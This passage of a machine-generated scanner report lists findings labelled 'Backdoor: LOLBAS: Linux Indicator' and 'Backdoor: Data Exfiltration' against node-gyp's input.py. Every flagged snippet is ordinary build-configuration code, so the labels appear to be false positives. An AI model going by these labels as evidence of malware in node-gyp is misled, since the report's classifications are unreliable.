                      "markdown": "`            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, variables, build_file)\n\n        # Strip off leading/trailing whitespace so that variable matches are\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 839,
                  "startColumn": 24,
                  "endLine": 839,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        if file_list:\n            processed_variables = gyp.simple_copy.deepcopy(variables)\n            ProcessListFiltersInDict(contents, processed_variables)\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n",
                    "rendered": {
                      "text": "        if file_list:\n            processed_variables = gyp.simple_copy.deepcopy(variables)\n            ProcessListFiltersInDict(contents, processed_variables)\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n",
                      "markdown": "`        if file_list:\n            processed_variables = gyp.simple_copy.deepcopy(variables)\n            ProcessListFiltersInDict(contents, processed_variables)\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 823,
                  "startColumn": 9,
                  "endLine": 823,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        # nested variables).\n        replace_end = replace_start + c_end\n\n        # Find the \"real\" replacement, matching the appropriate closing\n        # paren, and adjust the replacement start and end.\n        replacement = input_str[replace_start:replace_end]\n\n",
                    "rendered": {
                      "text": "        # nested variables).\n        replace_end = replace_start + c_end\n\n        # Find the \"real\" replacement, matching the appropriate closing\n        # paren, and adjust the replacement start and end.\n        replacement = input_str[replace_start:replace_end]\n\n",
                      "markdown": "`        # nested variables).\n        replace_end = replace_start + c_end\n\n        # Find the \"real\" replacement, matching the appropriate closing\n        # paren, and adjust the replacement start and end.\n        replacement = input_str[replace_start:replace_end]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 814,
                  "startColumn": 9,
                  "endLine": 814,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        replace_start = match_group.start(\"replace\")\n        replace_end = match_group.end(\"replace\")\n\n        # Find the ending paren, and re-evaluate the contained string.\n        (c_start, c_end) = FindEnclosingBracketGroup(input_str[replace_start:])\n\n        # Adjust the replacement range to match the entire command\n",
                    "rendered": {
                      "text": "        replace_start = match_group.start(\"replace\")\n        replace_end = match_group.end(\"replace\")\n\n        # Find the ending paren, and re-evaluate the contained string.\n        (c_start, c_end) = FindEnclosingBracketGroup(input_str[replace_start:])\n\n        # Adjust the replacement range to match the entire command\n",
                      "markdown": "`        replace_start = match_group.start(\"replace\")\n        replace_end = match_group.end(\"replace\")\n\n        # Find the ending paren, and re-evaluate the contained string.\n        (c_start, c_end) = FindEnclosingBracketGroup(input_str[replace_start:])\n\n        # Adjust the replacement range to match the entire command\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 790,
                  "startColumn": 36,
                  "endLine": 790,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    output = input_str\n    # Reverse the list of matches so that replacements are done right-to-left.\n    # That ensures that earlier replacements won't mess up the string in a\n    # way that causes later calls to find the earlier substituted text instead\n    # of what's intended for replacement.\n    matches.reverse()\n    for match_group in matches:\n",
                    "rendered": {
                      "text": "    output = input_str\n    # Reverse the list of matches so that replacements are done right-to-left.\n    # That ensures that earlier replacements won't mess up the string in a\n    # way that causes later calls to find the earlier substituted text instead\n    # of what's intended for replacement.\n    matches.reverse()\n    for match_group in matches:\n",
                      "markdown": "`    output = input_str\n    # Reverse the list of matches so that replacements are done right-to-left.\n    # That ensures that earlier replacements won't mess up the string in a\n    # way that causes later calls to find the earlier substituted text instead\n    # of what's intended for replacement.\n    matches.reverse()\n    for match_group in matches:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 700,
                  "startColumn": 47,
                  "endLine": 700,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    if type(string) is str:\n        # This function is called a lot so for maximum performance, avoid\n        # involving regexps which would otherwise make the code much\n        # shorter. Regexps would need twice the time of this function.\n        if string:\n            if string == \"0\":\n                return True\n",
                    "rendered": {
                      "text": "    if type(string) is str:\n        # This function is called a lot so for maximum performance, avoid\n        # involving regexps which would otherwise make the code much\n        # shorter. Regexps would need twice the time of this function.\n        if string:\n            if string == \"0\":\n                return True\n",
                      "markdown": "`    if type(string) is str:\n        # This function is called a lot so for maximum performance, avoid\n        # involving regexps which would otherwise make the code much\n        # shorter. Regexps would need twice the time of this function.\n        if string:\n            if string == \"0\":\n                return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 37,
                  "endLine": 439,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    # targets.\n    if \"target_defaults\" in build_file_data:\n        if \"targets\" not in build_file_data:\n            raise GypError(\"Unable to find targets in build file %s\" % build_file_path)\n\n        index = 0\n        while index < len(build_file_data[\"targets\"]):\n",
                    "rendered": {
                      "text": "    # targets.\n    if \"target_defaults\" in build_file_data:\n        if \"targets\" not in build_file_data:\n            raise GypError(\"Unable to find targets in build file %s\" % build_file_path)\n\n        index = 0\n        while index < len(build_file_data[\"targets\"]):\n",
                      "markdown": "`    # targets.\n    if \"target_defaults\" in build_file_data:\n        if \"targets\" not in build_file_data:\n            raise GypError(\"Unable to find targets in build file %s\" % build_file_path)\n\n        index = 0\n        while index < len(build_file_data[\"targets\"]):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 219,
                  "startColumn": 24,
                  "endLine": 219,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        return node.s\n    else:\n        raise TypeError(\n            \"Unknown AST node at key path '\" + \".\".join(keypath) + \"': \" + repr(node)\n        )\n\n\n",
                    "rendered": {
                      "text": "        return node.s\n    else:\n        raise TypeError(\n            \"Unknown AST node at key path '\" + \".\".join(keypath) + \"': \" + repr(node)\n        )\n\n\n",
                      "markdown": "`        return node.s\n    else:\n        raise TypeError(\n            \"Unknown AST node at key path '\" + \".\".join(keypath) + \"': \" + repr(node)\n        )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 11,
                  "endLine": 73,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    if \"_\" in section:\n        tail = section[-6:]\n        if tail[-1] == \"s\":\n            tail = tail[:-1]\n        if tail[-5:] in (\"_file\", \"_path\"):\n            return True\n        return tail[-4:] == \"_dir\"\n",
                    "rendered": {
                      "text": "    if \"_\" in section:\n        tail = section[-6:]\n        if tail[-1] == \"s\":\n            tail = tail[:-1]\n        if tail[-5:] in (\"_file\", \"_path\"):\n            return True\n        return tail[-4:] == \"_dir\"\n",
                      "markdown": "`    if \"_\" in section:\n        tail = section[-6:]\n        if tail[-1] == \"s\":\n            tail = tail[:-1]\n        if tail[-5:] in (\"_file\", \"_path\"):\n            return True\n        return tail[-4:] == \"_dir\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 7,
                  "endLine": 71,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    # is much faster than the regexp and this can be called hundreds of\n    # thousands of times so micro performance matters.\n    if \"_\" in section:\n        tail = section[-6:]\n        if tail[-1] == \"s\":\n            tail = tail[:-1]\n        if tail[-5:] in (\"_file\", \"_path\"):\n",
                    "rendered": {
                      "text": "    # is much faster than the regexp and this can be called hundreds of\n    # thousands of times so micro performance matters.\n    if \"_\" in section:\n        tail = section[-6:]\n        if tail[-1] == \"s\":\n            tail = tail[:-1]\n        if tail[-5:] in (\"_file\", \"_path\"):\n",
                      "markdown": "`    # is much faster than the regexp and this can be called hundreds of\n    # thousands of times so micro performance matters.\n    if \"_\" in section:\n        tail = section[-6:]\n        if tail[-1] == \"s\":\n            tail = tail[:-1]\n        if tail[-5:] in (\"_file\", \"_path\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2835,
                  "startColumn": 31,
                  "endLine": 2835,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        inputs = action.get(\"inputs\", None)\n        if inputs is None:\n            raise GypError(\"Action in target %s has no inputs.\" % target_name)\n        action_command = action.get(\"action\")\n        if action_command and not action_command[0]:\n            raise GypError(\"Empty action as command in target %s.\" % target_name)\n\n",
                    "rendered": {
                      "text": "        inputs = action.get(\"inputs\", None)\n        if inputs is None:\n            raise GypError(\"Action in target %s has no inputs.\" % target_name)\n        action_command = action.get(\"action\")\n        if action_command and not action_command[0]:\n            raise GypError(\"Empty action as command in target %s.\" % target_name)\n\n",
                      "markdown": "`        inputs = action.get(\"inputs\", None)\n        if inputs is None:\n            raise GypError(\"Action in target %s has no inputs.\" % target_name)\n        action_command = action.get(\"action\")\n        if action_command and not action_command[0]:\n            raise GypError(\"Empty action as command in target %s.\" % target_name)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2832,
                  "startColumn": 23,
                  "endLine": 2832,
                  "endColumn": 28,
                  "snippet": {
                    "text": "                \"Anonymous action in target %s.  \"\n                \"An action must have an 'action_name' field.\" % target_name\n            )\n        inputs = action.get(\"inputs\", None)\n        if inputs is None:\n            raise GypError(\"Action in target %s has no inputs.\" % target_name)\n        action_command = action.get(\"action\")\n",
                    "rendered": {
                      "text": "                \"Anonymous action in target %s.  \"\n                \"An action must have an 'action_name' field.\" % target_name\n            )\n        inputs = action.get(\"inputs\", None)\n        if inputs is None:\n            raise GypError(\"Action in target %s has no inputs.\" % target_name)\n        action_command = action.get(\"action\")\n",
                      "markdown": "`                \"Anonymous action in target %s.  \"\n                \"An action must have an 'action_name' field.\" % target_name\n            )\n        inputs = action.get(\"inputs\", None)\n        if inputs is None:\n            raise GypError(\"Action in target %s has no inputs.\" % target_name)\n        action_command = action.get(\"action\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2826,
                  "startColumn": 28,
                  "endLine": 2826,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n        if not action_name:\n            raise GypError(\n                \"Anonymous action in target %s.  \"\n",
                    "rendered": {
                      "text": "    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n        if not action_name:\n            raise GypError(\n                \"Anonymous action in target %s.  \"\n",
                      "markdown": "`    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n        if not action_name:\n            raise GypError(\n                \"Anonymous action in target %s.  \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2824,
                  "startColumn": 25,
                  "endLine": 2824,
                  "endColumn": 30,
                  "snippet": {
                    "text": "def ValidateActionsInTarget(target, target_dict, build_file):\n    \"\"\"Validates the inputs to the actions in a target.\"\"\"\n    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n        if not action_name:\n",
                    "rendered": {
                      "text": "def ValidateActionsInTarget(target, target_dict, build_file):\n    \"\"\"Validates the inputs to the actions in a target.\"\"\"\n    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n        if not action_name:\n",
                      "markdown": "`def ValidateActionsInTarget(target, target_dict, build_file):\n    \"\"\"Validates the inputs to the actions in a target.\"\"\"\n    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n        if not action_name:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2823,
                  "startColumn": 29,
                  "endLine": 2823,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\ndef ValidateActionsInTarget(target, target_dict, build_file):\n    \"\"\"Validates the inputs to the actions in a target.\"\"\"\n    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n",
                    "rendered": {
                      "text": "\ndef ValidateActionsInTarget(target, target_dict, build_file):\n    \"\"\"Validates the inputs to the actions in a target.\"\"\"\n    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n",
                      "markdown": "`\ndef ValidateActionsInTarget(target, target_dict, build_file):\n    \"\"\"Validates the inputs to the actions in a target.\"\"\"\n    target_name = target_dict.get(\"target_name\")\n    actions = target_dict.get(\"actions\", [])\n    for action in actions:\n        action_name = action.get(\"action_name\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2813,
                  "startColumn": 24,
                  "endLine": 2813,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            \"The 'working_directory' for 'run_as' in target %s \"\n            \"in file %s should be a string.\" % (target_name, build_file)\n        )\n    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n",
                    "rendered": {
                      "text": "            \"The 'working_directory' for 'run_as' in target %s \"\n            \"in file %s should be a string.\" % (target_name, build_file)\n        )\n    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n",
                      "markdown": "`            \"The 'working_directory' for 'run_as' in target %s \"\n            \"in file %s should be a string.\" % (target_name, build_file)\n        )\n    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2807,
                  "startColumn": 30,
                  "endLine": 2807,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            \"The 'action' for 'run_as' in target %s from file %s \"\n            \"must be a list.\" % (target_name, build_file)\n        )\n    working_directory = run_as.get(\"working_directory\")\n    if working_directory and type(working_directory) is not str:\n        raise GypError(\n            \"The 'working_directory' for 'run_as' in target %s \"\n",
                    "rendered": {
                      "text": "            \"The 'action' for 'run_as' in target %s from file %s \"\n            \"must be a list.\" % (target_name, build_file)\n        )\n    working_directory = run_as.get(\"working_directory\")\n    if working_directory and type(working_directory) is not str:\n        raise GypError(\n            \"The 'working_directory' for 'run_as' in target %s \"\n",
                      "markdown": "`            \"The 'action' for 'run_as' in target %s from file %s \"\n            \"must be a list.\" % (target_name, build_file)\n        )\n    working_directory = run_as.get(\"working_directory\")\n    if working_directory and type(working_directory) is not str:\n        raise GypError(\n            \"The 'working_directory' for 'run_as' in target %s \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2796,
                  "startColumn": 19,
                  "endLine": 2796,
                  "endColumn": 24,
                  "snippet": {
                    "text": "            \"The 'run_as' in target %s from file %s should be a \"\n            \"dictionary.\" % (target_name, build_file)\n        )\n    action = run_as.get(\"action\")\n    if not action:\n        raise GypError(\n            \"The 'run_as' in target %s from file %s must have an \"\n",
                    "rendered": {
                      "text": "            \"The 'run_as' in target %s from file %s should be a \"\n            \"dictionary.\" % (target_name, build_file)\n        )\n    action = run_as.get(\"action\")\n    if not action:\n        raise GypError(\n            \"The 'run_as' in target %s from file %s must have an \"\n",
                      "markdown": "`            \"The 'run_as' in target %s from file %s should be a \"\n            \"dictionary.\" % (target_name, build_file)\n        )\n    action = run_as.get(\"action\")\n    if not action:\n        raise GypError(\n            \"The 'run_as' in target %s from file %s must have an \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2788,
                  "startColumn": 24,
                  "endLine": 2788,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\ndef ValidateRunAsInTarget(target, target_dict, build_file):\n    target_name = target_dict.get(\"target_name\")\n    run_as = target_dict.get(\"run_as\")\n    if not run_as:\n        return\n    if type(run_as) is not dict:\n",
                    "rendered": {
                      "text": "\ndef ValidateRunAsInTarget(target, target_dict, build_file):\n    target_name = target_dict.get(\"target_name\")\n    run_as = target_dict.get(\"run_as\")\n    if not run_as:\n        return\n    if type(run_as) is not dict:\n",
                      "markdown": "`\ndef ValidateRunAsInTarget(target, target_dict, build_file):\n    target_name = target_dict.get(\"target_name\")\n    run_as = target_dict.get(\"run_as\")\n    if not run_as:\n        return\n    if type(run_as) is not dict:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2787,
                  "startColumn": 29,
                  "endLine": 2787,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n\ndef ValidateRunAsInTarget(target, target_dict, build_file):\n    target_name = target_dict.get(\"target_name\")\n    run_as = target_dict.get(\"run_as\")\n    if not run_as:\n        return\n",
                    "rendered": {
                      "text": "\n\ndef ValidateRunAsInTarget(target, target_dict, build_file):\n    target_name = target_dict.get(\"target_name\")\n    run_as = target_dict.get(\"run_as\")\n    if not run_as:\n        return\n",
                      "markdown": "`\n\ndef ValidateRunAsInTarget(target, target_dict, build_file):\n    target_name = target_dict.get(\"target_name\")\n    run_as = target_dict.get(\"run_as\")\n    if not run_as:\n        return\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2775,
                  "startColumn": 37,
                  "endLine": 2775,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        source_keys = [\"sources\"]\n        source_keys.extend(extra_sources_for_rules)\n        for source_key in source_keys:\n            for source in target_dict.get(source_key, []):\n                (source_root, source_extension) = os.path.splitext(source)\n                if source_extension.startswith(\".\"):\n                    source_extension = source_extension[1:]\n",
                    "rendered": {
                      "text": "        source_keys = [\"sources\"]\n        source_keys.extend(extra_sources_for_rules)\n        for source_key in source_keys:\n            for source in target_dict.get(source_key, []):\n                (source_root, source_extension) = os.path.splitext(source)\n                if source_extension.startswith(\".\"):\n                    source_extension = source_extension[1:]\n",
                      "markdown": "`        source_keys = [\"sources\"]\n        source_keys.extend(extra_sources_for_rules)\n        for source_key in source_keys:\n            for source in target_dict.get(source_key, []):\n                (source_root, source_extension) = os.path.splitext(source)\n                if source_extension.startswith(\".\"):\n                    source_extension = source_extension[1:]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2735,
                  "startColumn": 23,
                  "endLine": 2735,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    rule_names = {}\n    rule_extensions = {}\n\n    rules = target_dict.get(\"rules\", [])\n    for rule in rules:\n        # Make sure that there's no conflict among rule names and extensions.\n        rule_name = rule[\"rule_name\"]\n",
                    "rendered": {
                      "text": "    rule_names = {}\n    rule_extensions = {}\n\n    rules = target_dict.get(\"rules\", [])\n    for rule in rules:\n        # Make sure that there's no conflict among rule names and extensions.\n        rule_name = rule[\"rule_name\"]\n",
                      "markdown": "`    rule_names = {}\n    rule_extensions = {}\n\n    rules = target_dict.get(\"rules\", [])\n    for rule in rules:\n        # Make sure that there's no conflict among rule names and extensions.\n        rule_name = rule[\"rule_name\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2710,
                  "startColumn": 19,
                  "endLine": 2710,
                  "endColumn": 24,
                  "snippet": {
                    "text": "            \"Must be one of %s.\" % (target, target_type, \"/\".join(VALID_TARGET_TYPES))\n        )\n    if (\n        target_dict.get(\"standalone_static_library\", 0)\n        and not target_type == \"static_library\"\n    ):\n        raise GypError(\n",
                    "rendered": {
                      "text": "            \"Must be one of %s.\" % (target, target_type, \"/\".join(VALID_TARGET_TYPES))\n        )\n    if (\n        target_dict.get(\"standalone_static_library\", 0)\n        and not target_type == \"static_library\"\n    ):\n        raise GypError(\n",
                      "markdown": "`            \"Must be one of %s.\" % (target, target_type, \"/\".join(VALID_TARGET_TYPES))\n        )\n    if (\n        target_dict.get(\"standalone_static_library\", 0)\n        and not target_type == \"static_library\"\n    ):\n        raise GypError(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
